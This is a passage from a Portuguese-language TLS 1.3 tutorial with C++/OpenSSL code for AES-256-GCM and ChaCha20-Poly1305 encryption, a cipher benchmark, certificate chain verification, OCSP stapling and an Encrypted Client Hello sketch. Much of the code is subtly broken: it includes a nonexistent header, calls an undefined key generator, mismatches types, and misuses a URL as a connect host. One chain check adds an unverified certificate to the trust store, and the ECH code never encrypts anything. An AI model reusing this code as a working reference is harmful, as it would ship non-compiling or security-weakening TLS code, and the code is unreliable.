        ciphertext.resize(out_len);

        // Obter tag de autenticação
        std::vector<uint8_t> tag(TAG_SIZE);
        if (EVP_CIPHER_CTX_ctrl(ctx_, EVP_CTRL_GCM_GET_TAG,
                                  TAG_SIZE, tag.data()) != 1) {
            throw std::runtime_error("Falha ao obter tag");
        }

        return {ciphertext, tag, iv};
    }

    // Descriptografar dados
    std::vector<uint8_t> decrypt(const std::vector<uint8_t>& key,
                                  const std::vector<uint8_t>& ciphertext,
                                  const std::vector<uint8_t>& tag,
                                  const std::vector<uint8_t>& iv,
                                  const std::vector<uint8_t>& aad = {}) {
        if (key.size() != KEY_SIZE) {
            throw std::runtime_error("Tamanho de chave inválido");
        }
        if (tag.size() != TAG_SIZE) {
            throw std::runtime_error("Tamanho de tag inválido");
        }
        if (iv.size() != IV_SIZE) {
            throw std::runtime_error("Tamanho de IV inválido");
        }

        // Configurar contexto para descriptografia
        if (EVP_DecryptInit_ex2(ctx_, EVP_aes_256_gcm(),
                                  key.data(), iv.data(), nullptr) != 1) {
            throw std::runtime_error("Falha ao inicializar descriptografia");
        }

        // Processar AAD
        if (!aad.empty()) {
            int out_len = 0;
            if (EVP_DecryptUpdate(ctx_, nullptr, &out_len,
                                    aad.data(), aad.size()) != 1) {
                throw std::runtime_error("Falha ao processar AAD");
            }
        }

        // Descriptografar dados
        std::vector<uint8_t> plaintext(ciphertext.size());
        int out_len = 0;
        if (EVP_DecryptUpdate(ctx_, plaintext.data(), &out_len,
                                ciphertext.data(), ciphertext.size()) != 1) {
            throw std::runtime_error("Falha ao descriptografar dados");
        }

        // Configurar tag esperada
        if (EVP_CIPHER_CTX_ctrl(ctx_, EVP_CTRL_GCM_SET_TAG,
                                  TAG_SIZE, const_cast<uint8_t*>(tag.data())) != 1) {
            throw std::runtime_error("Falha ao configurar tag");
        }

        // Finalizar e verificar tag
        int final_len = 0;
        int ret = EVP_DecryptFinal_ex(ctx_, plaintext.data() + out_len,
                                        &final_len);
        if (ret != 1) {
            throw std::runtime_error("Falha na verificação de autenticação (tag inválida)");
        }
        out_len += final_len;
        plaintext.resize(out_len);

        return plaintext;
    }

private:
    EVP_CIPHER_CTX* ctx_;
};

// Exemplo de uso com TLS 1.3
void demonstrate_aes256gcm_tls13() {
    std::cout << "=== Demonstração AES-256-GCM para TLS 1.3 ===\n";

    // Gerar chave
    auto key = Aes256Gcm::generate_key();
    std::cout << "Chave gerada (" << key.size() * 8 << " bits)\n";

    // Dados para criptografar
    std::string message = "Mensagem secreta via TLS 1.3";
    std::vector<uint8_t> plaintext(message.begin(), message.end());

    // AAD (Additional Authenticated Data)
    // No TLS 1.3, isso inclui o registro TLS header
    std::vector<uint8_t> aad = {0x17, 0x03, 0x03, 0x00, 0x19}; // TLS Application Data

    // Criptografar
    Aes256Gcm cipher;
    auto encrypted = cipher.encrypt(key, plaintext, aad);

    std::cout << "Texto cifrado: " << encrypted.ciphertext.size() << " bytes\n";
    std::cout << "Tag: " << encrypted.tag.size() << " bytes\n";
    std::cout << "IV: " << encrypted.iv.size() << " bytes\n";

    // Descriptografar
    auto decrypted = cipher.decrypt(key, encrypted.ciphertext,
                                      encrypted.tag, encrypted.iv, aad);

    std::string decrypted_msg(decrypted.begin(), decrypted.end());
    std::cout << "Texto decifrado: " << decrypted_msg << "\n";
    std::cout << "Mensagem original: " << message << "\n";
    std::cout << "Autenticidade verificada: " << (decrypted_msg == message ? "SIM" : "NÃO") << "\n";
}
```

### 5.3 ChaCha20-Poly1305

ChaCha20-Poly1305 é uma alternativa ao AES-GCM, especialmente útil em dispositivos sem hardware AES:

- **Chave**: 256 bits (32 bytes)
- **Nonce**: 96 bits (12 bytes)
- **Tag de autenticação**: 128 bits (16 bytes)
- **Vantagem**: Software-only, resistente a ataques de canal lateral

```c++
#include <openssl/evp.h>
#include <openssl/rand.h>

#include <iostream>
#include <vector>

class ChaCha20Poly1305 {
public:
    static constexpr size_t KEY_SIZE = 32;
    static constexpr size_t IV_SIZE = 12;
    static constexpr size_t TAG_SIZE = 16;

    ChaCha20Poly1305() : ctx_(EVP_CIPHER_CTX_new()) {
        if (!ctx_) {
            throw std::runtime_error("Falha ao criar contexto");
        }
    }

    ~ChaCha20Poly1305() {
        if (ctx_) EVP_CIPHER_CTX_free(ctx_);
    }

    struct EncryptedData {
        std::vector<uint8_t> ciphertext;
        std::vector<uint8_t> tag;
        std::vector<uint8_t> iv;
    };

    EncryptedData encrypt(const std::vector<uint8_t>& key,
                           const std::vector<uint8_t>& plaintext,
                           const std::vector<uint8_t>& aad = {}) {
        auto iv = generate_iv();

        // Inicializar criptografia
        if (EVP_EncryptInit_ex2(ctx_, EVP_chacha20_poly1305(),
                                  key.data(), iv.data(), nullptr) != 1) {
            throw std::runtime_error("Falha ao inicializar ChaCha20-Poly1305");
        }

        // Processar AAD
        if (!aad.empty()) {
            int out_len;
            if (EVP_EncryptUpdate(ctx_, nullptr, &out_len,
                                    aad.data(), aad.size()) != 1) {
                throw std::runtime_error("Falha ao processar AAD");
            }
        }

        // Criptografar
        std::vector<uint8_t> ciphertext(plaintext.size());
        int out_len;
        if (EVP_EncryptUpdate(ctx_, ciphertext.data(), &out_len,
                                plaintext.data(), plaintext.size()) != 1) {
            throw std::runtime_error("Falha ao criptografar");
        }

        int final_len;
        if (EVP_EncryptFinal_ex(ctx_, ciphertext.data() + out_len,
                                  &final_len) != 1) {
            throw std::runtime_error("Falha ao finalizar");
        }
        ciphertext.resize(out_len + final_len);

        // Obter tag
        std::vector<uint8_t> tag(TAG_SIZE);
        if (EVP_CIPHER_CTX_ctrl(ctx_, EVP_CTRL_AEAD_GET_TAG,
                                  TAG_SIZE, tag.data()) != 1) {
            throw std::runtime_error("Falha ao obter tag");
        }

        return {ciphertext, tag, iv};
    }

    std::vector<uint8_t> decrypt(const std::vector<uint8_t>& key,
                                  const std::vector<uint8_t>& ciphertext,
                                  const std::vector<uint8_t>& tag,
                                  const std::vector<uint8_t>& iv,
                                  const std::vector<uint8_t>& aad = {}) {
        // Inicializar descriptografia
        if (EVP_DecryptInit_ex2(ctx_, EVP_chacha20_poly1305(),
                                  key.data(), iv.data(), nullptr) != 1) {
            throw std::runtime_error("Falha ao inicializar");
        }

        // Processar AAD
        if (!aad.empty()) {
            int out_len;
            if (EVP_DecryptUpdate(ctx_, nullptr, &out_len,
                                    aad.data(), aad.size()) != 1) {
                throw std::runtime_error("Falha ao processar AAD");
            }
        }

        // Descriptografar
        std::vector<uint8_t> plaintext(ciphertext.size());
        int out_len;
        if (EVP_DecryptUpdate(ctx_, plaintext.data(), &out_len,
                                ciphertext.data(), ciphertext.size()) != 1) {
            throw std::runtime_error("Falha ao descriptografar");
        }

        // Configurar tag
        if (EVP_CIPHER_CTX_ctrl(ctx_, EVP_CTRL_AEAD_SET_TAG,
                                  TAG_SIZE, const_cast<uint8_t*>(tag.data())) != 1) {
            throw std::runtime_error("Falha ao configurar tag");
        }

        // Verificar e finalizar
        int final_len;
        if (EVP_DecryptFinal_ex(ctx_, plaintext.data() + out_len,
                                  &final_len) != 1) {
            throw std::runtime_error("Tag de autenticação inválida");
        }
        plaintext.resize(out_len + final_len);

        return plaintext;
    }

private:
    EVP_CIPHER_CTX* ctx_;

    std::vector<uint8_t> generate_iv() {
        std::vector<uint8_t> iv(IV_SIZE);
        if (RAND_bytes(iv.data(), IV_SIZE) != 1) {
            throw std::runtime_error("Falha ao gerar IV");
        }
        return iv;
    }
};
```

### 5.4 Comparação de Performance

```c++
#include <chrono>
#include <iostream>
#include <vector>

struct BenchmarkResult {
    double encrypt_throughput;  // MB/s
    double decrypt_throughput;  // MB/s
    double encrypt_latency_ns;  // nanosegundos por operação
    double decrypt_latency_ns;
};

class CipherBenchmark {
public:
    static BenchmarkResult benchmark_aes_gcm(const std::vector<uint8_t>& key,
                                              size_t data_size,
                                              size_t iterations) {
        Aes256Gcm cipher;
        auto iv = Aes256Gcm::generate_iv();
        std::vector<uint8_t> plaintext(data_size, 0x42);
        std::vector<uint8_t> aad = {0x17, 0x03, 0x03};

        // Benchmark de criptografia
        auto start = std::chrono::high_resolution_clock::now();
        Aes256Gcm::EncryptedData last_encrypted;
        for (size_t i = 0; i < iterations; ++i) {
            last_encrypted = cipher.encrypt(key, plaintext, aad);
        }
        auto end = std::chrono::high_resolution_clock::now();

        double encrypt_time = std::chrono::duration<double>(end - start).count();
        double encrypt_throughput = (static_cast<double>(data_size) * iterations) /
                                    (encrypt_time * 1024 * 1024);
        double encrypt_latency = (encrypt_time * 1e9) / iterations;

        // Benchmark de descriptografia
        start = std::chrono::high_resolution_clock::now();
        for (size_t i = 0; i < iterations; ++i) {
            auto decrypted = cipher.decrypt(key, last_encrypted.ciphertext,
                                              last_encrypted.tag,
                                              last_encrypted.iv, aad);
        }
        end = std::chrono::high_resolution_clock::now();

        double decrypt_time = std::chrono::duration<double>(end - start).count();
        double decrypt_throughput = (static_cast<double>(data_size) * iterations) /
                                    (decrypt_time * 1024 * 1024);
        double decrypt_latency = (decrypt_time * 1e9) / iterations;

        return {encrypt_throughput, decrypt_throughput,
                encrypt_latency, decrypt_latency};
    }

    static BenchmarkResult benchmark_chacha20(const std::vector<uint8_t>& key,
                                               size_t data_size,
                                               size_t iterations) {
        ChaCha20Poly1305 cipher;
        std::vector<uint8_t> plaintext(data_size, 0x42);
        std::vector<uint8_t> aad = {0x17, 0x03, 0x03};

        // Benchmark de criptografia
        auto start = std::chrono::high_resolution_clock::now();
        ChaCha20Poly1305::EncryptedData last_encrypted;
        for (size_t i = 0; i < iterations; ++i) {
            last_encrypted = cipher.encrypt(key, plaintext, aad);
        }
        auto end = std::chrono::high_resolution_clock::now();

        double encrypt_time = std::chrono::duration<double>(end - start).count();
        double encrypt_throughput = (static_cast<double>(data_size) * iterations) /
                                    (encrypt_time * 1024 * 1024);
        double encrypt_latency = (encrypt_time * 1e9) / iterations;

        // Benchmark de descriptografia
        start = std::chrono::high_resolution_clock::now();
        for (size_t i = 0; i < iterations; ++i) {
            auto decrypted = cipher.decrypt(key, last_encrypted.ciphertext,
                                              last_encrypted.tag,
                                              last_encrypted.iv, aad);
        }
        end = std::chrono::high_resolution_clock::now();

        double decrypt_time = std::chrono::duration<double>(end - start).count();
        double decrypt_throughput = (static_cast<double>(data_size) * iterations) /
                                    (decrypt_time * 1024 * 1024);
        double decrypt_latency = (decrypt_time * 1e9) / iterations;

        return {encrypt_throughput, decrypt_throughput,
                encrypt_latency, decrypt_latency};
    }

    static void run_comparison() {
        const size_t DATA_SIZE = 16384;  // 16KB
        const size_t ITERATIONS = 10000;

        auto key_aes = Aes256Gcm::generate_key();
        auto key_chacha = ChaCha20Poly1305::generate_key();

        std::cout << "\n=== Benchmark: AES-256-GCM vs ChaCha20-Poly1305 ===\n";
        std::cout << "Tamanho dos dados: " << DATA_SIZE << " bytes\n";
        std::cout << "Iterações: " << ITERATIONS << "\n\n";

        auto aes_result = benchmark_aes_gcm(key_aes, DATA_SIZE, ITERATIONS);
        auto chacha_result = benchmark_chacha20(key_chacha, DATA_SIZE, ITERATIONS);

        std::cout << "AES-256-GCM:\n";
        std::cout << "  Encrypt throughput: " << aes_result.encrypt_throughput << " MB/s\n";
        std::cout << "  Decrypt throughput: " << aes_result.decrypt_throughput << " MB/s\n";
        std::cout << "  Encrypt latency: " << aes_result.encrypt_latency << " ns\n";
        std::cout << "  Decrypt latency: " << aes_result.decrypt_latency << " ns\n\n";

        std::cout << "ChaCha20-Poly1305:\n";
        std::cout << "  Encrypt throughput: " << chacha_result.encrypt_throughput << " MB/s\n";
        std::cout << "  Decrypt throughput: " << chacha_result.decrypt_throughput << " MB/s\n";
        std::cout << "  Encrypt latency: " << chacha_result.encrypt_latency << " ns\n";
        std::cout << "  Decrypt latency: " << chacha_result.decrypt_latency << " ns\n\n";

        std::cout << "Comparação (AES-GCM vs ChaCha20):\n";
        std::cout << "  Encrypt: "
                  << (aes_result.encrypt_throughput > chacha_result.encrypt_throughput ? "AES-GCM" : "ChaCha20")
                  << " mais rápido\n";
        std::cout << "  Decrypt: "
                  << (aes_result.decrypt_throughput > chacha_result.decrypt_throughput ? "AES-GCM" : "ChaCha20")
                  << " mais rápido\n";
    }
};
```

---

## 6. Certificate Verification: Chain of Trust, OCSP Stapling

### 6.1 Cadeia de Confiança

No TLS 1.3, a verificação de certificados segue a mesma cadeia de confiança do TLS 1.2:

```
Root CA (Confiança implícita)
    |
    Intermediate CA
    |
    End Entity (Servidor)
```

### 6.2 Implementação de Verificação de Certificado

```c++
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <openssl/x509.h>
#include <openssl/x509v3.h>
#include <openssl/pem.h>
#include <openssl/chain.h>

#include <iostream>
#include <string>
#include <vector>
#include <memory>

class CertificateVerifier {
public:
    CertificateVerifier() : store_(nullptr) {
        store_ = X509_STORE_new();
        if (!store_) {
            throw std::runtime_error("Falha ao criar X509_STORE");
        }
    }

    ~CertificateVerifier() {
        if (store_) X509_STORE_free(store_);
    }

    bool load_system_trust_store() {
        // Carregar CA bundle do sistema
        if (X509_STORE_set_default_paths(store_) != 1) {
            ERR_print_errors_fp(stderr);
            return false;
        }
        std::cout << "CA bundle do sistema carregado\n";
        return true;
    }

    bool load_ca_file(const char* ca_file) {
        if (X509_STORE_load_locations(store_, ca_file, nullptr) != 1) {
            ERR_print_errors_fp(stderr);
            return false;
        }
        std::cout << "CA file carregado: " << ca_file << "\n";
        return true;
    }

    bool load_ca_directory(const char* ca_dir) {
        if (X509_STORE_load_locations(store_, nullptr, ca_dir) != 1) {
            ERR_print_errors_fp(stderr);
            return false;
        }
        std::cout << "CA directory carregado: " << ca_dir << "\n";
        return true;
    }

    struct VerificationResult {
        bool valid;
        std::string error_message;
        std::vector<std::string> chain;
        int depth;
    };

    VerificationResult verify_certificate(X509* cert,
                                           const std::string& expected_hostname) {
        VerificationResult result;
        result.valid = false;
        result.depth = -1;

        // Criar cadeia de certificados
        STACK_OF(X509)* chain = X509_STORE_get0_objects(store_);
        X509_STORE_CTX* ctx = X509_STORE_CTX_new();

        if (!ctx) {
            result.error_message = "Falha ao criar contexto de verificação";
            return result;
        }

        // Configurar contexto
        if (X509_STORE_CTX_init(ctx, store_, cert, nullptr) != 1) {
            result.error_message = "Falha ao inicializar contexto";
            X509_STORE_CTX_free(ctx);
            return result;
        }

        // Configurar flags de verificação
        X509_STORE_CTX_set_flags(ctx,
            X509_V_FLAG_CRL_CHECK |
            X509_V_FLAG_CRL_CHECK_ALL |
            X509_V_FLAG_X509_STRICT);

        // Verificar hostname se fornecido
        if (!expected_hostname.empty()) {
            X509_STORE_CTX_set0_param(ctx,
                build_verification_param(expected_hostname));
        }

        // Realizar verificação
        int verify_result = X509_verify_cert(ctx);

        if (verify_result == 1) {
            result.valid = true;

            // Obter cadeia verificada
            STACK_OF(X509)* verified_chain = X509_STORE_CTX_get0_chain(ctx);
            if (verified_chain) {
                int chain_len = sk_X509_num(verified_chain);
                result.depth = chain_len - 1;

                for (int i = 0; i < chain_len; ++i) {
                    X509* ca_cert = sk_X509_value(verified_chain, i);
                    char subject[256];
                    X509_NAME_oneline(X509_get_subject_name(ca_cert),
                                       subject, sizeof(subject));
                    result.chain.push_back(subject);
                }
            }
        } else {
            int error_code = X509_STORE_CTX_get_error(ctx);
            result.error_message = X509_verify_cert_error_string(error_code);
        }

        X509_STORE_CTX_cleanup(ctx);
        X509_STORE_CTX_free(ctx);

        return result;
    }

    bool check_certificate_expiry(X509* cert) {
        const ASN1_TIME* not_before = X509_get0_notBefore(cert);
        const ASN1_TIME* not_after = X509_get0_notAfter(cert);

        if (!not_before || !not_after) {
            return false;
        }

        // Verificar se o certificado é válido atualmente
        int day, sec;
        if (ASN1_TIME_diff(&day, &sec, nullptr, not_after) == 0) {
            return false;
        }

        if (day < 0 || sec < 0) {
            // Certificado expirado
            return false;
        }

        return true;
    }

    bool check_certificate_chain(STACK_OF(X509)* chain) {
        if (!chain || sk_X509_num(chain) == 0) {
            return false;
        }

        // Verificar cada certificado na cadeia
        for (int i = 0; i < sk_X509_num(chain) - 1; ++i) {
            X509* cert = sk_X509_value(chain, i);
            X509* issuer = sk_X509_value(chain, i + 1);

            // Verificar se o issuer assinou o certificado
            if (X509_check_issued(issuer, cert) != X509_V_OK) {
                return false;
            }

            // Verificar validade temporal
            if (!check_certificate_expiry(cert)) {
                return false;
            }
        }

        // Verificar o root (auto-assinado)
        X509* root = sk_X509_value(chain, sk_X509_num(chain) - 1);
        if (X509_check_issued(root, root) != X509_V_OK) {
            // Root não é auto-assinado? Pode ser intermediário
            // Verificar se está no store
            if (X509_STORE_add_cert(store_, root) != 1) {
                return false;
            }
        }

        return true;
    }

private:
    X509_STORE* store_;

    X509_VERIFY_PARAM* build_verification_param(const std::string& hostname) {
        X509_VERIFY_PARAM* param = X509_VERIFY_PARAM_new();
        if (!param) return nullptr;

        // Configurar hostname para verificação
        X509_VERIFY_PARAM_set1_host(param, hostname.c_str(), hostname.size());

        // Configurar flags
        X509_VERIFY_PARAM_set_purpose(param, X509_PURPOSE_SSL_SERVER);
        X509_VERIFY_PARAM_set_trust(param, X509_TRUST_SSL_SERVER);

        return param;
    }
};
```

### 6.3 OCSP Stapling

OCSP Stapling permite que o servidor forneça proofs de revogação de certificados diretamente, evitando que o cliente precise acessar o OCSP responder:

```c++
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <openssl/ocsp.h>
#include <openssl/x509.h>
#include <openssl/pem.h>

#include <iostream>
#include <vector>
#include <chrono>
#include <thread>

class OcspStapling {
public:
    OcspStapling() : ctx_(nullptr) {}

    ~OcspStapling() {
        if (ctx_) SSL_CTX_free(ctx_);
    }

    bool initialize(SSL_CTX* server_ctx) {
        ctx_ = SSL_CTX_new(TLS_server_method());
        if (!ctx_) return false;

        // Copiar configurações do contexto principal
        SSL_CTX_set_min_proto_version(ctx_, TLS1_3_VERSION);

        // Habilitar OCSP Stapling
        SSL_CTX_set_tlsext_status_type(ctx_, TLSEXT_STATUSTYPE_ocsp);

        // Callback para obter resposta OCSP
        SSL_CTX_set_tlsext_status_cb(ctx_, ocsp_callback);
        SSL_CTX_set_tlsext_status_arg(ctx_, this);

        return true;
    }

    // Buscar resposta OCSP do responder
    std::vector<uint8_t> fetch_ocsp_response(X509* cert,
                                               X509* issuer,
                                               const char* ocsp_url) {
        // Criar request OCSP
        OCSP_REQUEST* req = OCSP_REQUEST_new();
        if (!req) return {};

        // Adicionar certificado para verificação
        OCSP_CERTID* cert_id = OCSP_cert_to_id(nullptr, cert, issuer);
        if (!cert_id) {
            OCSP_REQUEST_free(req);
            return {};
        }

        if (OCSP_request_add0_id(req, cert_id) != 1) {
            OCSP_CERTID_free(cert_id);
            OCSP_REQUEST_free(req);
            return {};
        }

        // Criar bio para enviar request
        BIO* bio = BIO_new_connect(ocsp_url);
        if (!bio) {
            OCSP_REQUEST_free(req);
            return {};
        }

        // Serializar request
        BIO* req_bio = BIO_new(BIO_s_mem());
        if (i2d_OCSP_REQUEST_bio(req_bio, req) != 1) {
            BIO_free(bio);
            BIO_free(req_bio);
            OCSP_REQUEST_free(req);
            return {};
        }

        // Enviar request
        BUF_MEM* req_data;
        BIO_get_mem_ptr(req_bio, &req_data);

        // Simular envio HTTP
        std::string http_request =
            "POST / HTTP/1.1\r\n"
            "Host: " + std::string(ocsp_url) + "\r\n"
            "Content-Type: application/ocsp-request\r\n"
            "Content-Length: " + std::to_string(req_data->length) + "\r\n"
            "\r\n";

        BIO_puts(bio, http_request.c_str());
        BIO_write(bio, req_data->data, req_data->length);
        BIO_flush(bio);

        // Ler resposta
        char response_buffer[65536];
        int bytes_read = BIO_read(bio, response_buffer, sizeof(response_buffer));

        BIO_free(bio);
        BIO_free(req_bio);
        OCSP_REQUEST_free(req);

        if (bytes_read <= 0) return {};

        // Parse da resposta HTTP
        std::string response(response_buffer, bytes_read);
        size_t header_end = response.find("\r\n\r\n");
        if (header_end == std::string::npos) return {};

        // Verificar status HTTP
        if (response.find("200 OK") == std::string::npos) {
            std::cerr << "OCSP responder retornou erro\n";
            return {};
        }

        // Extrair corpo da resposta
        std::string body = response.substr(header_end + 4);
        return std::vector<uint8_t>(body.begin(), body.end());
    }

    // Verificar se a resposta OCSP é válida
    bool verify_ocsp_response(const std::vector<uint8_t>& response_data,
                               X509* cert,
                               X509* issuer) {
        const unsigned char* data = response_data.data();
        OCSP_RESPONSE* resp = d2i_OCSP_RESPONSE(nullptr, &data, response_data.size());
        if (!resp) {
            std::cerr << "Falha ao parsear resposta OCSP\n";
            return false;
        }

        // Verificar status da resposta
        int status = OCSP_response_status(resp);
        if (status != OCSP_RESPONSE_STATUS_SUCCESSFUL) {
            std::cerr << "OCSP responder retornou status: " << status << "\n";
            OCSP_RESPONSE_free(resp);
            return false;
        }

        // Obter resposta básica
        OCSP_BASICRESP* bs = OCSP_response_get1_basic(resp);
        if (!bs) {
            OCSP_RESPONSE_free(resp);
            return false;
        }

        // Verificar assinatura da resposta
        if (OCSP_basic_verify(bs, issuer, nullptr, 0) != 1) {
            ERR_print_errors_fp(stderr);
            OCSP_BASICRESP_free(bs);
            OCSP_RESPONSE_free(resp);
            return false;
        }

        // Verificar certificado específico
        OCSP_CERTID* cert_id = OCSP_cert_to_id(nullptr, cert, issuer);
        int cert_status;
        ASN1_TIME* this_update;
        ASN1_TIME* next_update;

        if (OCSP_resp_find_status(bs, cert_id, &cert_status, nullptr,
                                    &this_update, &next_update) != 1) {
            OCSP_CERTID_free(cert_id);
            OCSP_BASICRESP_free(bs);
            OCSP_RESPONSE_free(resp);
            return false;
        }

        bool valid = (cert_status == V_OCSP_CERTSTATUS_GOOD);

        if (!valid) {
            std::cerr << "Certificado revogado via OCSP\n";
        }

        OCSP_CERTID_free(cert_id);
        OCSP_BASICRESP_free(bs);
        OCSP_RESPONSE_free(resp);

        return valid;
    }

private:
    SSL_CTX* ctx_;

    static int ocsp_callback(SSL* ssl, void* arg) {
        OcspStapling* self = static_cast<OcspStapling*>(arg);

        // Obter resposta OCSP cacheada
        const unsigned char* resp_data;
        long resp_len = SSL_get_tlsext_status_ocsp_resp(ssl, &resp_data);

        if (resp_data && resp_len > 0) {
            // Resposta já está cacheada
            return SSL_TLSEXT_ERR_OK;
        }

        // Em produção: buscar resposta OCSP periodicamente e cachear
        // Aqui apenas retornamos erro para demonstração
        return SSL_TLSEXT_ERR_NOACK;
    }
};
```

---

## 7. SNI and Encrypted Client Hello (ECH)

### 7.1 Server Name Indication (SNI)

SNI permite que o cliente especifique o hostname desejado no ClientHello, permitindo que servidores hospedem múltiplos domínios no mesmo IP:

```
ClientHello {
    ...
    Extension server_name {
        ServerNameList server_name_list<1..2^16-1>;
        ServerName {
            NameType name_type;
            select (name_type) {
                case host_name: HostName host_name<1..2^16-1>;
            } server_name;
        }
    }
}
```

### 7.2 Encrypted Client Hello (ECH)

ECH é uma extensão recente que criptografa o ClientHello, protegendo:
- O hostname solicitado (privacidade)
- As extensões enviadas (fingerprinting)
- Previne ataques de censura baseados em SNI

```c++
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <openssl/core_names.h>

#include <iostream>
#include <vector>
#include <string>
#include <cstring>
#include <functional>

// Implementação simplificada de ECH para demonstração
// Em produção, use bibliotecas como o HPKE do OpenSSL

class EncryptedClientHello {
public:
    struct EchConfig {
        uint16_t version;
        uint16_t public_key_len;
        std::vector<uint8_t> public_key;
        uint8_t cipher_suite_id;
        uint16_t encrypted_inner_name_len;
        std::string inner_hostname;
        std::string outer_hostname;
    };

    // Serializar ECHConfig para ClientHello
    static std::vector<uint8_t> serialize_ech_config(const EchConfig& config) {
        std::vector<uint8_t> serialized;

        // Versão (2 bytes)
        serialized.push_back((config.version >> 8) & 0xFF);
        serialized.push_back(config.version & 0xFF);

        // Comprimento da chave pública (2 bytes)
        serialized.push_back((config.public_key_len >> 8) & 0xFF);
        serialized.push_back(config.public_key_len & 0xFF);

        // Chave pública
        serialized.insert(serialized.end(),
                          config.public_key.begin(),
                          config.public_key.end());

        // ID da cifra-suíte (1 byte)
        serialized.push_back(config.cipher_suite_id);

        // Comprimento do nome encriptado (2 bytes)
        serialized.push_back((config.encrypted_inner_name_len >> 8) & 0xFF);
        serialized.push_back(config.encrypted_inner_name_len & 0xFF);

        return serialized;
    }

    // Construir ClientHello com ECH
    struct ClientHelloWithEch {
        std::vector<uint8_t> outer_hello;  // Para o proxy/DNS
        std::vector<uint8_t> inner_hello;  // Para o servidor real
    };

    static ClientHelloWithEch build_client_hello(
            const std::string& outer_sni,
            const std::string& inner_sni,
            const EchConfig& ech_config) {

        ClientHelloWithEch result;

        // Outer SNI (visível para intermediários)
        result.outer_hello = build_hello_with_sni(outer_sni);

        // Inner SNI (criptografado, para o servidor)
        result.inner_hello = build_hello_with_sni(inner_sni);

        // Em implementação real: criptografar inner_hello com HPKE
        // usando a public_key do ech_config

        return result;
    }

    // Verificar se ECH foi aceito
    static bool verify_ech_accepted(const std::vector<uint8_t>& server_hello) {
        // Verificar se o servidor retornou EncryptedExtensions
        // com ECHConfig (confirmação de aceitação)
        // Em produção: parsear a mensagem real do TLS

        // Simplificação: verificar se há extensão de confirmação
        return false; // Implementação real complexa
    }

private:
    static std::vector<uint8_t> build_hello_with_sni(const std::string& sni) {
        std::vector<uint8_t> hello;

        // TLS Record Header
        hello.push_back(0x16);  // ContentType: Handshake
        hello.push_back(0x03);  // Version: TLS 1.2 (legacy)
        hello.push_back(0x01);
        hello.push_back(0x00);  // Length (placeholder)
        hello.push_back(0x00);

        // ClientHello handshake
        hello.push_back(0x01);  // HandshakeType: ClientHello

        // Versão TLS 1.2 (por compatibilidade)
        hello.push_back(0x03);
        hello.push_back(0x03);

        // Random (32 bytes)
        for (int i = 0; i < 32; ++i) {
            hello.push_back(static_cast<uint8_t>(i));
        }

        // Session ID Length = 0
        hello.push_back(0x00);

        // Cipher Suites (placeholder)
        hello.push_back(0x00);
        hello.push_back(0x02);
        hello.push_back(0x13);
        hello.push_back(0x01);  // TLS_AES_128_GCM_SHA256

        // Compression Methods
        hello.push_back(0x01);
        hello.push_back(0x00);  // null

        // Extensions Length (placeholder)
        hello.push_back(0x00);
        hello.push_back(0x00);

        // SNI Extension
        hello.push_back(0x00);  // ExtensionType: server_name
        hello.push_back(0x00);

        // SNI Extension Data
        uint16_t sni_len = static_cast<uint16_t>(sni.size() + 5);
        hello.push_back((sni_len >> 8) & 0xFF);
        hello.push_back(sni_len & 0xFF);

        // Server Name List Length
        uint16_t list_len = static_cast<uint16_t>(sni.size() + 3);
        hello.push_back((list_len >> 8) & 0xFF);
        hello.push_back(list_len & 0xFF);

        // Name Type: host_name (0)
        hello.push_back(0x00);

        // Name Length
        hello.push_back((sni.size() >> 8) & 0xFF);
        hello.push_back(sni.size() & 0xFF);

        // Name
        hello.insert(hello.end(), sni.begin(), sni.end());

        return hello;
    }
};

// Exemplo de uso com OpenSSL
class EchEnabledClient {
public:
    EchEnabledClient() : ctx_(nullptr), ssl_(nullptr) {}

    ~EchEnabledClient() {
        if (ssl_) SSL_free(ssl_);
        if (ctx_) SSL_CTX_free(ctx_);
    }

    bool initialize(const std::string& outer_sni,
                     const std::string& inner_sni) {
        ctx_ = SSL_CTX_new(TLS_client_method());
        if (!ctx_) return false;

        SSL_CTX_set_min_proto_version(ctx_, TLS1_3_VERSION);

        ssl_ = SSL_new(ctx_);
        if (!ssl_) return false;

        // Configurar SNI externo (visível para intermediários)
        SSL_set_tlsext_host_name(ssl_, outer_sni.c_str());

        // Em OpenSSL 3.x com suporte a ECH:
        // SSL_set1_ech_server_list(ssl_, ech_config_list);
        // SSL_set0_ech_grease(ssl_, 1); // Habilitar GREASE ECH

        outer_sni_ = outer_sni;
        inner_sni_ = inner_sni;

        return true;
    }

    bool connect(int sockfd) {
        SSL_set_fd(ssl_, sockfd);

        int ret = SSL_connect(ssl_);
        if (ret != 1) {
            int err = SSL_get_error(ssl_, ret);
            print_ssl_errors(err);
            return false;
        }

        return true;
    }

    void print_connection_info() const {
        if (!ssl_) return;

        std::cout << "\n=== Conexão com ECH ===\n";
        std::cout << "SNI externo (proxy): " << outer_sni_ << "\n";
        std::cout << "SNI interno (servidor): " << inner_sni_ << "\n";
        std::cout << "Protocolo: " << SSL_get_version(ssl_) << "\n";

        const SSL_CIPHER* cipher = SSL_get_current_cipher(ssl_);
        if (cipher) {
            std::cout << "Cifra: " << SSL_CIPHER_get_name(cipher) << "\n";
        }

        // Verificar se ECH foi usado
        // Em OpenSSL 3.x: SSL_get_ech_status(ssl_)
        std::cout << "ECH: Implementação em OpenSSL 3.2+\n";
        std::cout << "===========================\n";
    }

private:
    SSL_CTX* ctx_;
    SSL* ssl_;
    std::string outer_sni_;
    std::string inner_sni_;

    void print_ssl_errors(int err) const {
        switch (err) {
            case SSL_ERROR_SSL:
                std::cerr << "Erro SSL: ";
                ERR_print_errors_fp(stderr);
                break;
            case SSL_ERROR_SYSCALL:
                std::cerr << "Erro de sistema: " << strerror(errno) << "\n";
                break;
            default:
                std::cerr << "Erro SSL: " << err << "\n";
        }
    }
};
```

---

## 8. OpenSSL 3.x TLS Implementation

### 8.1 SSL_CTX Configuration

```c++
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <openssl/x509.h>
#include <openssl/x509v3.h>
#include <openssl/pem.h>
#include <openssl/ocsp.h>
#include <openssl/core_names.h>
#include <openssl/param_build.h>
#include <openssl/provider.h>

#include <iostream>
#include <memory>
#include <string>
#include <functional>
#include <map>

class OpenSSLTlsContext {
public:
    OpenSSLTlsContext() : ctx_(nullptr), default_provider_(nullptr) {
        // OpenSSL 3.x: carregar providers padrão
